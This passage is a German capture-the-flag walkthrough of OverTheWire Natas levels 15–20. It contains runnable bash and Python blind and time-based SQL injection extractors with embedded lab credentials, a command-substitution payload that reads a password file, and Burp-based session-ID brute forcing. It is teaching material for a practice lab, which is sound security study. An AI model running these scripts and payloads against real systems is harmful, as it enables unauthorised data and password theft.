Allerdings kannst du das auch mit SQL-Injections, die gewisse Vorzeichen enthalten, wie `<`, `>` oder `=` herausfinden. Da du davon ausgehen kannst, die Längen der Passwörter in realen Datenbanken nicht zu kennen.

Auf das `natas15` Beispiel angewendet, kannst du folgenden Befehl nutzen, um die Länge des Passworts zu erhalten:

```php
# Überprüft, ob die Länge des Inhalts im Passwort für natas16 32 Bytes groß ist.
natas16" And Length(password) = 32 #
```

Um Passwörter und ihre Länge zu überprüfen, ersetzt du die Zahl `32` mit der Zahl, die du prüfen willst.

Das Passwort der `natas`-Level ist 32 Bytes groß. Das erzeugt den "`This user exists.`" Response. Alle anderen Zahlen erzeugen die Fehlermeldung, der User existiere nicht.

Kleine Skripte in `Python` oder `Shell` helfen dabei, die Anfragen im Hintergrund mit Tools wie `cURL` durchzuführen. Das macht den Prozess der Iteration einfacher.   
Für echte Penetrationstests wird die Automatisierung von Blind SQL Injection immer mit spezialisierten Frameworks wie `SQLMap` oder `Python` (mit der `requests`-Library) durchgeführt. Diese Tools übernehmen die Handhabung der URL-Kodierung, die Iterationslogik (binäre Suche vs. sequentiell) und die boolesche Indikator-Erkennung weitaus zuverlässiger als ein bash-Skript.

Ich habe mir von der KI ein Programm schreiben lassen, das genau diesen Prozess bewerkstelligt. Das Progamm ist in der Programmiersprache `bash` geschrieben und beinhaltet im Wesentlichen zwei `For-Schleifen`, von der die erste Schleife die Position des Passworts addiert und die zweite Schleife das Alphabet durchläuft.   
Das Alphabet wird in der Variable `$ALPHABET` deklariert. 

Kopiere das Skript oder schreibe dein eigenes. Du solltest nur kontrollieren, ob die Authentifizierungs-Daten aktuell sind, falls nicht, dann änderst du diese in der `AUTH`-Variable.

<details><summary>Code anzeigen</summary>

Kopieren und ausführen mit `./deinDateiname.sh`
```bash
#!/bin/bash

# Das Alphabet deklarieren
ALPHABET="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
# Zeichenlänge des Passworts
MAX_LENGTH=33
# Server URL und Authentifikation
URL="http://natas15.natas.labs.overthewire.org/index.php"
AUTH="natas15:5dQIqbsFcz3YotINYfRZSzWbLKm0lrVx" # Prüfen, ob Zugangsdaten aktuell

# Payload Base und Ende // %27 URL-Encoding für das Zeichen ' 
PAYLOAD_BASE='natas16" AND (SELECT 1 FROM users WHERE username=%27natas16%27 AND binary SUBSTRING(password,'
PAYLOAD_END=",1)='__CHAR__') #" # CHAR als Platzhalter, wird später ersetzt in $SQL-INJECTION_TEST
PASSWORD=""

echo "Starting Blind SQLi..."
echo -n "Found Password: " # Start der fortlaufenden Ausgabe

# Iteriert die Position einzelner Passwortzeichen
for ((POS=1; POS <= MAX_LENGTH; POS++)); do
    FOUND_CHAR=0

    # Iteriert die Variable ALPHABET
    for ((I=0; I < ${#ALPHABET}; I++)); do
        CHAR="${ALPHABET:$I:1}"

        # Payload-Konstruktion || __CHAR__/ Platzhalter wird ersetzt durch /$CHAR Variable
        SQL_INJECTION_TEST="${PAYLOAD_BASE}${POS}${PAYLOAD_END/__CHAR__/$CHAR}"
        
        # Neue Variablendeklaration für Payload
        POST_DATA="${SQL_INJECTION_TEST}"
        
        # Curl führt im Hintergrund (-s) aus und sendet Exploits
        RESPONSE=$(curl -s -u "$AUTH" -d "$POST_DATA" "$URL")
        
        # Indikator-Prüfung
        if echo "$RESPONSE" | grep -q "This user exists"; then
            
            # Speichere das ASCII-Zeichen, für das endgültige Passwort
            PASSWORD="$PASSWORD$CHAR" 
            
            # Nur das Zeichen ausgeben, da die Ausgabe mit -n gemacht wurde
            echo -n "$CHAR" 
            
            FOUND_CHAR=1
            break # Zeichen gefunden, nächste Position prüfen
        fi
    done
    
    # LOGIK: Wenn nach Durchlauf des gesamten Alphabets KEIN Zeichen gefunden wurde,
    # ist das Passwort zu Ende.
    if [ $FOUND_CHAR -eq 0 ]; then
        break
    fi
done

# Endausgabe
echo -e "\n\nPassword is: $PASSWORD"
```
</details>

Nachdem du das Skript bei dir lokal kopiert und erstellt hast, kannst du es mit folgendem Befehl ausführen:

```bash
./dateiname.sh
```

Das wird ein wenig Zeit in Anspruch nehmen, da 32 Zeichen des Passworts mit den 62 Zeichen aus der definierten Alphabet-Variable iteriert werden. Das geschieht automatisch mit dem `curl`-Befehl. Sollte die ersten Position nicht ermitteln werden können, bricht das Programm automatisch mit einer Fehlermeldung ab. Dann kannst du noch einmal die Variablen überprüfen und sie korrigieren, wenn nötig. Achte auf das aktuelle Passwort von `natas15`.


Wenn das Programm erfolgreich war, dann erhälst du das Passwort und kannst mit dem nächsten Level fortsetzen.

![Natas16 Password mit Skript](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas16d.png)


</details>


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 16 -> 17

```text
Username:   natas16

URL:        http://natas16.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>


In `natas16` ist die Challenge über eine **Blind Command Injection** (via Side-Channel) oder Size-Based Side-Channel Attacke das Password zu extrahieren.    
Über den Source Code (üblicherweise über die Entwickleroptionen erreichbar) gibt dir Aufschluss über den Code und was darin passiert.

![Natas16 SourceCode](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas17.png)

In `natas16` wird ein `$_REQUEST` über das Eingabefeld an den Server übermittelt, um die Wörter aus einer Datei (`dictionary.txt`) auszugeben.
Der Befehl `grep` wird dafür genutzt, um den Inhalt aus der Datei zu lesen.

Wenn du Eingaben in das "Suchfeld" machst, dann erhält die Variable `$key` den Wert aus dieser und `grep` sucht `dictionary.txt` danach. 

![Natas16 SourceCode](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas17e.png)

Allerdings werden bestimmte Zeichen über die `PHP`-Funktion `preg_match()` gefiltert. Es werden jedoch nicht alle Zeichen gefilter. Das `^` oder die Command Substitution `$()` sind möglich. Deshalb kannst du nur über eine Command Substitution mit `$()` das Passwort mit einer Boolean-Based-Logik überprüfen.

Die Blacklist (`preg_match('/[;|&'"]/', $key)`) ist auf typische Shell−Steuerzeichen beschränkt.Entscheidend ist, dass die ∗∗CommandSubstitution∗∗ über die `()`-Syntax (Dollar-Klammern) **nicht gefiltert** wird, während die historische **Backtick-Substitution** (`` ... ``) blockiert ist. Da die Benutzereingabe (`$key`)in **doppelten Anführungszeichen** (`"..."`)an `passthru()` übergeben wird,führt die Unix−Shell die `()`-Substitution **vor** der Ausführung des äußeren `grep`-Befehls durch.

Boolean-Based deshalb, weil die korrekte Annahme den inneren Befehl (`grep`) einen Ausgabewert liefern lässt, der die Logik des äußeren Befehls (`grep`) umkehrt. Die Besonderheit an den Fehlermeldungen von `natas16` ist die die Ausgabe der gesamten Liste.

> **Technischer Kern:** "Der Angriff nutzt eine Time-Difference/Size-Difference Side-Channel-Logik, die auf der Ausgabe des inneren `grep`-Befehls basiert."   
> Die Boolean-Based SQL Injection prüft wahr/falsch über die Datenbank. Hier wird die Shell-Substitutionslogik genutzt, um die Ausgabe des inneren Befehls als Input für den äußeren grep zu missbrauchen.

**1. Starte den Angriff über BurpSuite**
Die Software `Burp` ist bereits auf der Kali Linux Umgebung vorhanden und das hilft dabei, die Angriffe zu automatisieren.

Außerdem ist es hilfreich, die Firefox Extension `foxyproxy` zu installieren, mit dem du eine Verbindung zu Burp herstellen kannst, damit der **Proxy** die Inhalte empfangen kann. Dazu klickst du auf den Reiter `Proxy` und stellst den **Interceptor** aktiv.   
Lade die Seite einmal neu, damit die Datenverbindung über den Proxy laufen.

Sende den Inhalt an den **Intruder**, damit du den boolean-based Payload automatisieren kannst.

![Natas16 Intruder Konfiguration für Payload](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas17f.png)

Im linken Feld gibst du nach dem `GET`-Parameter den URL Pfad mit dem Payload `grep ^a /etc/natas_webpass/natas17`. Achte darauf, dass du die Eingabe umwandelst, da in URLs grundsätzlich URL-Encoding stattfindet.

Der umgewandelte **Payload** lautet:
```text
?needle=%24%28grep+%5E+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search
```

Wähle auf der rechten Seite in den **Payloads** den Payload type `Simple list` und leg in den **Payload configuration** die Liste der Strings für den Payload fest. Für das Passwort sind es die Zeichen `a-z`, `A-Z` und `0-9`. Gib in das Feld rechts neben dem `Add`-Button die Zeichen nacheinander ein und bestätige mit der Enter-Taste.

![Natas16 Intruder Konfiguration für Payload](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas17c.png)

Konfiguriere im nächsten Schritt die Variable, die du suchst. Klicke im Intruder über dem Request-Header mit dem Payload auf `Add §` um eine Variable hinzuzufügen - in meinem Beispiel ist es `§char§`.

Die Variable iteriert die 62 Zeichen aus der Payload-Liste und gibt dir als Feedback die Hauptseite von `natas16` zurück. Bevor du mit dem Payload beginnst, solltest du folgendes wissen:

- Es wird etwas Zeit in Anspruch nehmen, weil die Prozedur bedingt automatisch ist, da sie dein Eingreifen bei erfolgreichem Ergebnis erfordert.
- Nachdem dein Payload erfolgreich war, fügst du das jeweilige Zeichen an die Stelle ein, wo du den Payload gestartet hast und schiebst damit die Variable ein Zeichen weiter.

Um den Payload zu senden klickst du auf den orangenen Button **Start attack**. 



Im unteren Screenshot siehst du einen Auszug aus dem Paylod. 
Das dein Payload erfolgreich war, erkennst du daran, dass die **Length** der Hauptseite `1334` Bytes beträgt (nur HTML-Gerüst), während die Anfragen, die nicht erfolgreich waren, eine Length von über `40.000` Bytes liefern. 

Die Länge von ca. 40.000 Bytes (FAIL) tritt auf, weil der innere `grep` nichts findet, einen leeren String (`""`) an den äußeren `grep` übergibt. Der äußere Befehl wird zu `grep -i "" dictionary.txt`, der jede Zeile der Datei matcht und daher die gesamte dictionary.txt ausgibt.

Das liegt daran, dass .der Payload im kleineren Response keine Ergebnisse übermittelt, weil die Bedingung über` grep ^{char} /etc/natas_webpass/natas17` überprüft, ob das Zeichen in der Datei vorhanden ist. Die Ausgabe ist deshalb klein (SUCCESS), weil der innere `grep` etwas findet (den Passworteintrag), diesen Wert an den äußeren `grep` übergibt (`grep -i "passwort" dictionary.txt`), und dieser Wert keine Entsprechung in der `dictionary.txt` findet.

![Natas16 Intruder Konfiguration für Payload](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas17d.png)

Merke dir das Zeichen und füge es im Payload mit den nächsten Angriffen ein. Im Beispiel oben erhält der Payload in der ersten Zeile den Buchstaben `j`, sodass im nächsten Angriff der gesamte Payload dann wie folgt deklariert wird:

```text
                Hier fügst du nacheinander die Zeichen ein
                         |
                         v
?needle=%24%28grep+%5EEqj§char§+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search
```

Das machst solange, bis du das gesamte Passwort, bestehend aus 32 Zeichen erhältst :-).


</details>

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Natas 17 -> 18

```text
Username:   natas17

URL:        http://natas17.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Level `natas17` stellt eine fortgeschrittene **Boolean Based Blind SQL Injection**-Herausforderung dar.

- **Ziel:** Die Abfrage so konstruieren, dass der Server die Seite nur dann mit einem bestimmten Inhalt (z.B. "`user does not exist`") oder einer bestimmten Größe zurückgibt, wenn die Bedingung im SQL-Statement wahr (`True`) ist.

- **Signal:** Die Verzögerung der HTTP-Antwortzeit ist das Signal für eine Bedingung, die eintrifft (`true`).

- **Keine Fehlermeldungen:** Die Anwendung ist so konfiguriert, dass sie bei SQL-Syntaxfehlern oder falschen Abfragen keine sichtbaren Fehler (wie die `mysql_fetch_array` Warnung aus früheren Leveln) auf `/index.php` erzeugt. Dies verhindert **Error-Based Injection**.

- **Kein Boolean-Based Output:** Da das System bei erfolgreicher Abfrage oft nur eine leere Seite oder eine statische Meldung liefert, die sich kaum unterscheidet, wird eine einfache Boolean-Based Injection (Abfrage auf `true`/`false` durch Seiteninhalt) schwierig.

- **Notwendigkeit eines Seitenkanals:** Da direkte oder boolesche Ausgaben fehlschlagen, muss ein Seitenkanal (**Side-Channel**) genutzt werden. Hierbei wird die Datenbank gezwungen, eine messbare Aktion durchzuführen, die auf der Wahrheit einer Bedingung basiert.

**Der Source Code von `natas17`**

![Natas17 Source Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas18b.png)

In einem der vorherigen Level nutzte ich eine **Time-Based Boolean Injection** (`sleep()`) als Versuch eines Side-Channel Angriffs, um zu überprüfen, ob die Seite auf SQL-Injections anschlägt. Dabei dient die Verzögerung der HTTP-Antwortzeit als boolesches Signal.

Eine Bedingung ist somit **wahr**, wenn die Antwortzeit verzögert wird und falsch, wenn die Bedingung nicht eintrifft.
Beispiel:
- **Wahr:** Response Time >= 5 Sekunden => Zeichen korrekt.
- **Falsch:** Response Time < 1 Sekunden => Zeichen inkorret.

**Wichtig:** Die Funktion `sleep()` kann von Entwicklern in Produktionssystemen blockiert oder entfernt werden, um diese Art von Angriff zu verhindern.

Diesmal habe ich für das Extrahieren des Passwortes ein Python Skript erstellt. Die KI hat mir dabei geholfen.

**1. Python Skrip erstellen**

**Die Payload Struktur:**

Der Kern des Skripts ist der SQL-Payload, der an den username-Parameter gesendet wird:

```sql
natas18" AND (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING(password, pos, 1))=val, SLEEP(5), 0))a) #
```

- `natas18"`: String-Start, tatsächliche SQL-Query schließt hier den `username`-String ab.
- `AND (SELECT 1 FROM ... )`: Fügt die zusätzliche Abfrage zur `WHERE`-Klausel hinzu.
- `IF(BEDINGUNG, WAHR, FALSCH)`: Wenn die Bedingung wahr ist, wird `SLEEP(5)` ausgeführt.
- `ASCII(SUBSTRING(password, pos, 1))`: Extrahiert das Zeichen an der aktuellen **pos**ition und wandelt es in seinen ASCII-Wert (`val`) um.
- `SLEEP(5)`: (Sidechannel) Verzögert die Antwort des Datenbankservers um 5 Sekunden.
- `)a) #`: Schließt die verschachtelte `SELECT`-Struktur und kommentiert den Rest der ursprünglichen SQL-Abfrage aus (`#`).

Nachfolgend ist das Python Skript, welches die Zeichen `a-z`, `A-Z` sowie die Zahlen `0-9` in einer For-Schleife iteriert und bei einem Treffer, die Position addiert und mit dem nächsten Zeichen fortfährt.

```python
import requests
import time
from string import ascii_letters, digits

# --- 1. KONFIGURATION FÜR NATAS 17 ---
TARGET_URL = "http://natas17.natas.labs.overthewire.org/" 

# Das Alphabet wird zur Definition des ASCII-Bereichs verwendet
# Wir testen alle druckbaren alphanumerischen Zeichen und den Unterstrich
CHAR_SET = ascii_letters + digits
# Wir nutzen die ASCII-Werte 32 (Space) bis 126 (Tilde) als Sicherheitsbereich.
# Für Natas-Passwörter reicht oft 48 (0) bis 122 (z).
ASCII_MIN = 48  # ASCII-Code für '0'
ASCII_MAX = 122 # ASCII-Code für 'z'
PASSWORD_LENGTH = 32
SLEEP_TIME = 5 # Sekunden, die der SQL-Befehl pausieren soll
TIMEOUT = SLEEP_TIME + 2 # Das Timeout muss länger sein als die Pausenzeit

found_password = ""
print(f"Starte Time-Based Blind SQLi auf {TARGET_URL}...")
print(f"Suche nach {PASSWORD_LENGTH} Zeichen im ASCII-Bereich {ASCII_MIN}-{ASCII_MAX} (0-z)...")

# --- 2. HAUPTSCHLEIFE: ITERATION DURCH DIE POSITIONEN ---
# Die Position (pos) beginnt bei 1 (SQL-Standard)
for pos in range(1, PASSWORD_LENGTH + 1):
    char_found = False
    
    # --- 3. INNERE SCHLEIFE: ITERATION DURCH DIE ASCII-WERTE ---
    # val ist der ASCII-Wert, der getestet wird (z.B. 97 für 'a')
    for val in range(ASCII_MIN, ASCII_MAX + 1):
        
        # SQLI PAYLOAD FÜR NATAS 17
        # Die Abfrage wird als Wert für den POST-Parameter 'username' gesendet.
        # Syntax: 'natas18' AND (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING(password, pos, 1))=val, SLEEP(5), 0))a) #
        
        payload = (f'natas18" AND (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING(password, {pos}, 1))={val}, SLEEP({SLEEP_TIME}), 0))a) #')

        post_data = {"username": payload}
        
        # --- 4. ZEITBASIERTE ÜBERPRÜFUNG ---
        try:
            start_time = time.time()
            # Führe POST-Request aus
            r = requests.post(
                TARGET_URL,
                headers={"Authorization", "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=="},
                data=post_data,
                timeout=TIMEOUT # Wichtig: Timeout muss größer als SLEEP_TIME sein
            )
            end_time = time.time()
            
            response_time = end_time - start_time
            
            # ÜBERPRÜFUNG: Wenn die Antwortzeit länger ist als die Schlafenszeit, war die Bedingung WAHR.
            if response_time >= SLEEP_TIME:
                found_char = chr(val)
                found_password += found_char
                print(f"[{pos:02}/{PASSWORD_LENGTH}] Treffer: ASCII {val} ('{found_char}') -> {found_password}")
                char_found = True
                break
                
        except requests.exceptions.Timeout:
             # Wenn das Timeout (z.B. 7s) erreicht wird, ABER die Antwortzeit > SLEEP_TIME (z.B. 5s) wäre,
             # ist die Bedingung erfüllt. Bei time-based Injection muss dies nicht als Fehler behandelt werden.
             # Da die Request-Timeout höher als SLEEP_TIME gesetzt haben, sollte dies hier nur bei Netzwerkfehlern passieren.
             found_char = chr(val)
             found_password += found_char
             print(f"[{pos:02}/{PASSWORD_LENGTH}] Treffer (Timeout): ASCII {val} ('{found_char}') -> {found_password}")
             char_found = True
             break
        except requests.exceptions.RequestException as e:
            print(f"\nVerbindungsfehler bei Position {pos}, Wert {val}: {e}")
            break
            
    if not char_found:
        print(f"--- KEIN ZEICHEN GEFUNDEN in Position {pos}. ---")
        break

print(f"\nFinales Passwort: {found_password}")
```

Führe das Skript im Terminal über die Eingabe aus:
```bash
python3 deinDateiname.py
```

Wenn es erfolgreich ausgeführt wird, dann erhältst du das Passwort:

![Natas18 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas18c.png)


</details>


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Natas 18 -> 19

```text
Username:   natas18

URL:        http://natas18.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Mit Blick auf den Source Code von `natas18` liegt die Vermutung nah, dass es bei diesem Exploit um einen **Session Prediction-** oder **Brute Force-Angriff** handeln könnte.

Die Anwendung verwendet **`PHPSESSID`-Cookies** zur Verwaltung des Benutzerstatus. Um das Passwort von `natas19` zu erhalten, muss die Session des Benutzers auf Admin-Rechte umgestellt werden.


![Natas18 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas19.png)

**1. Source Code Analyse**

<details><summary>Ausschnitt aus dem Source Code anzeigen</summary>

![Natas18 Source Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas19b.png)

</details>

1. Die `maxid`-Variable
    - Die Variable `$maxid = 640;` legt die maximale **Obergrenze** für die zufällig generierten Benutzer-IDs fest, die im System verwendet werden können.
    - **Bedeutung:** Jede neu erzeugte ID (mittels `createID`) wird im Bereich von **1** bis **640** liegen.

    - **Implikation für den Angriff:** Da die mögliche Bandbreite der Benutzer-IDs sehr klein ist (nur 640), wird dies ein Hauptangriffsvektor sein. Es deutet auf eine **Session Fixation** oder einen **Brute-Force-Angriff** auf die Session-ID hin, da die Anzahl der möglichen gültigen IDs sehr überschaubar ist.

2. Funktionale Zerlegung
    
    - `function isValidAdminLogin() { ... }`
        - **Zweck:** Diese Funktion sollte ursprünglich die Anmeldeinformationen auf Gültigkeit prüfen, ist aber derzeit deaktiviert.
    
    - `function isValidID($id) { ... }`

        - **Zweck:** Prüft, ob eine übergebene ID gültig ist.
        - **Logik:** Die ID wird auf numerischen Typ geprüft (`is_numeric($id)`).
        - **Rückgabe:** Gibt `true` zurück, wenn die ID numerisch ist, ansonsten false. (**Achtung: Dies ist eine sehr schwache Validierung, da keine Bereichsprüfung gegen `$maxid` stattfindet.**)

    - `function createID(&$user) { ... }`
        - **Zweck:** Erzeugt eine zufällige, neue Benutzer-ID.
        - **Logik:**
            - Prüft, ob die Session-ID (`PHPSESSID`) im Cookie existiert und mit `isValidID` numerisch validiert wird.

            - Wenn die Session-ID existiert und gültig ist, wird die Session gestartet (`session_start()`).

            - **Wichtige Prüfungen nach erfolgreichem Start:**

                - Prüft, ob in der Session bereits ein `admin`-Flag gesetzt ist.

                - Falls das `admin`-Flag existiert, wird die Session-Variable `$_SESSION["admin"]` auf **0** gesetzt, um sicherzustellen, dass man kein Admin ist.

            - **Rückgabe:** `true` bei erfolgreichem Session-Start, ansonsten `false`.

Der Code ist gegen typische Angriffe wie **SQL Injection** immun (keine SQL-Abfragen sichtbar), hat aber eine klare Schwachstelle:

Die Schwachstelle: **Session Hijacking durch Brute-Force**

- Die Funktion setzt den Session-Wert `$_SESSION["admin"]` nur dann auf **0**, wenn ein altes `admin`-Flag bereits in der Session existiert.

- Wenn eine Session gestartet wird, die neu ist oder bei der das `admin`-Flag nicht gesetzt wurde, gibt es eine temporäre Lücke.

- Die Session-ID (`PHPSESSID`) wird dem `$id` übergeben und mit `isValidID` geprüft, welches nur auf `is_numeric` prüft.

- Da die möglichen Session-IDs durch `$maxid = 640` begrenzt sind, ist der Angriffsvektor klar: **Session Brute-Force (Session Prediction/Hijacking)**.

Ziel ist es, einen Angriff zu finden, der die Range der Variable `$maxid = 640` nutzt und die Payloads an den Server übermittelt.

Nutze Burp, das bereits auf Kali Linux installiert ist und starte einen automatischen Brute Force Angriff über den Intruder.

Sende die Seite an den Proxy von Burp, damit du die wichtigen Header erhältst. Nutze `foxyproxy` um die Datenpakete an Burp zu senden.

![Natas18 Burp Proxy](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas19e.png)

Sobald du die Daten in Burp hast, sende sie mit einem Rechtsklick an den **Intruder**, wo du die Einstellungen für den Brute Force Angriff konfigurierst.

1. Klicke auf **Proxy**.
2. Klicke auf **Intercept off** um ihn zu aktivieren.
3. Übermittle entweder ein leeres Formular oder gib Daten in die Eingabefelder ein (irrelevant).
4. Sobald du die Daten erhalten hast: Rechtsklick auf das Ergebnis von `natas18` und **Send to Intruder** auswählen.
![Natas18 senden an den Intruder ](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas19f.png)

5. Auf den Reiter **Intruder** klicken und Einstellungen vornehmen: 

![Natas18 Intruder konfigurieren](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas19c.png)
   - Mit `Add §` legst du eine Variable fest - ich habe sie `admin` genannt.
   - In den **Payloads** nutzt du den **type** `Numbers`.
   - Lege die Range von 0 bis 640 fest. Die maximalen Größe der Zahlen kann aufgrund `maxid`-Variable nur 3 Stellen betragen.

Starte den Angriff und warte, bis du einen Response erhältst, dessen HTML-Length anders ist. Bei mir war es der 120. Payload und der `PHPSESSID` **119**.

![Natas18 Passwort für das natas19](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas19d.png)

Damit solltest du das Passwort für das nächste Level `natas19` erhalten haben und kannst mit der Challenge fortfahren.

</details>


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Natas 19 -> 20

```text
Username:   natas19

URL:        http://natas19.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Das Level `natas19` baut auf der **Session Prediction-Schwachstelle** von `natas18` auf, indem es lediglich einen zusätzlichen Kodierungsschritt einführt. Der `PHPSESSID`-Cookie wird in **Hexadezimal** umgewandelt. 

- **Schwachstelle:** Die begrenzte Anzahl von möglichen Session-IDs durch `maxid=640` führt dazu, dass die Session-ID vorhersehbar ist.

- **Angriffsvektor:** **Session Brute-Force** (oder **Session Prediction**) der `PHPSESSID`.

- **Ziel:** Eine `PHPSESSID` zu finden, die im Dekodierprozess die Session eines Admins repräsentiert, typischerweise durch die Erfüllung der Bedingung `idnum-admin`.

![Natas19 Hauptanwendung](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas20.png)
 

Du musst also einen Weg finden, wie du den Benutzernamen `admin` mit der `PHPSESSID` so kombinierst, dass du aus diesen zwei Werten eine hexadezimale Zahlenfolge erhältst.

![Natas19 Source Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas20b.png)

**1. Im Source Code siehst du:**

In der Funktion `createID()` wird die hexadezimale Umwandlung vom zusammengesetzten String `$idstr = "$idnum-$user";` generiert und zurückgegeben.

```php
function createID(&$user) {
    global $maxid;
    $idnum = rand(1, $maxid);
    $idstr = "$idnum-$user"; // z.B. "320-admin"
    return bin2hex($idstr);  // Rückgabe: Hex-String
}
```

- Die Funktion `bin2hex()` konvertiert den rohen Binär-String (`$idstr`), der aus der zufälligen ID, dem Bindestrich und dem Benutzernamen besteht (z.B. "`320-admin`"), in seine hexadezimale Darstellung.

- **Beleg:** Der Bindestrich (`-`) wird zu seinem ASCII-Hex-Wert `2d` kodiert. Der String "`320-admin`" wird zu `3332302d61646d696e`.

Die erfolgreiche Session-ID muss diese Struktur (Zahl-Bindestrich-admin) haben. Da die Anwendung die Eingabe eines Benutzers erwartet, müssen wir die `PHPSESSID` so setzen, dass die interne Logik des Servers diesen dekodierten String (z.B. "`119-admin`") interpretiert.

Schau dir die Cookies des Requests an und du wirst den `PHPSESSID`-Cookie im **Cookie**-Header sehen. Wenn du den Wert kopierst, kannst du herausfinden, ob es sich tatsächlich um die hexadezimale Schreibweise handelt und deine Annahme bestätigt.

![Natas19 PHPSESSID Nachweis hexadezimal kodierter String](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas20c.png)


**2. Bestätige deine Annahme mit der Umwandlung in ASCII**

Geh auf **cyberchef.io** und wähle in der linken Seite die Option `From HEX` aus und füge den `PHPSESSID`-Wert in das rechte Eingabefeld.

Entweder musst du für die Umwandlung auf den **grünen Bake** Button drücken oder es geschieht automatisch, weil das Häkchen gesetzt ist.

![Natas19 Umwandlugn für PoC](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas20d.png)

Du siehst, dass es noch wichtig ist, ein `-` (Hex `2d`) in die Umwandlung hinzuzufügen, bevor das Datenpaket an den Server übermittelt wird.

**3. Starte den Exploit**

Du kannst den Brute-Force Angriff wieder über Burp automatisieren. 

Aufgrund der notwendigen vollständigen Hex-Kodierung des Musters POS-admin (inklusive des Bindestrichs), die von Burps Standard-Payload-Regeln nicht effizient abgebildet werden kann, ist die Generierung einer vollständigen Payload-Liste der effizienteste Ansatz.

Der folgende Python-Dreizeiler stellt sicher, dass alle 640 möglichen Session-Strings korrekt kodiert werden.

```python
# Python-Skript zur Generierung der Liste:
for pos in range(1, 641):
    s = f"{pos}-admin"
    print(s.encode('utf-8').hex())
```

**Wichtig:** `s.encode('utf-8').hex()` entspricht funktional der PHP-Funktion `bin2hex()`, da der String zuerst in seine Byte-Darstellung (binär) umgewandelt und dann in Hexadezimal dargestellt wird.


Das Bash-Kommando leitet die Ausgabe direkt in eine Datei zur einfachen Übertragung nach Burp um:

```bash
python3 deinDateiname.py > payloadliste.txt
```

1. Sende einen beliebigen **Request** an den Intruder.

2. Drücke links auf den Button `Add §` um eine Variable in den Request hinzuzufügen.

3. Klicke im Reiter **Intruder** im rechten Menü unter Payload auf den Payload type und wähle `Simple list` aus. 

4. In den **Payload configuration** klickst du auf den Button **Load** und lädst die eben erstellte Liste des Python Skripts. Das sollte dir alle Positionen von **1 - 640** (inklusive) importieren.

**Hinweis:** Die Regeln im Screenshot brauchst du nicht zu beachten. Sie waren ein Versuch, den hexadezimal kodierten String über die Anweisungen zu erstellen.

![Natas19 Payload in Burp importieren](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas20e.png)


Starte den Angriff und warte, bis die in hexadezimal kodierten **640** `PHPSESSID`'s an den Server übermittelt werden.

Bei erfolgreichen Exploit erhältst du wieder eine Length der HTML-Seite, die sich von den anderen unterscheidet. Diese HTML sollte das Passwort für `natas20` zurückgeben.


![Natas19 Passwort über Brute-Force Angriff](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas20f.png)


**Wichtig zu wissen:** Die `maxid` von **640** ist ein extrem kleines und willkürlich gewähltes Limit, das in realen Anwendungen als **Session Prediction-Schwachstelle** sofort auffallen würde. Moderne Session-IDs nutzen kryptografisch sichere, lange, zufällige Zeichenketten, um Brute-Force-Angriffe dieser Art unmöglich zu machen.

</details>


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Natas 20 -> 21

```text
Username:   natas20

URL:        http://natas20.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

In `natas20` ist es eine klassische **Session-Daten-Manipulation** (**Session Poisoning**), die durch die fehlerhafte Implementierung der eigenen Session-Handler `myread` und `mywrite` ermöglicht wird.

![Natas20 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas21.png)

**Code Analyse:**

![Natas20 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas21b.png)

Die Funktion `mywrite($sid, $data)` speichert die Session-Daten in einer benutzerdefinierten Formatierung.

```php
function mywrite($sid, $data){
    // ... (Längen- und Zeichen-Allowlist für $sid) ...
    
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    ksort($_SESSION); // Sortiert das Session-Array nach Schlüssel
    foreach($_SESSION as $key => $value) {
        $data .= "$key $value\n"; // <-- SCHWACHSTELLE
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}
```

- **Fakt 1:** Der `name`-Parameter aus dem Formular wird in `$_SESSION["name"]` gespeichert.

- **Fakt 2:** Die `mywrite`-Funktion nimmt den Wert (`$value`) aus `$_SESSION` und schreibt ihn direkt in die Datei, gefolgt von einem Newline-Zeichen (`\n`).

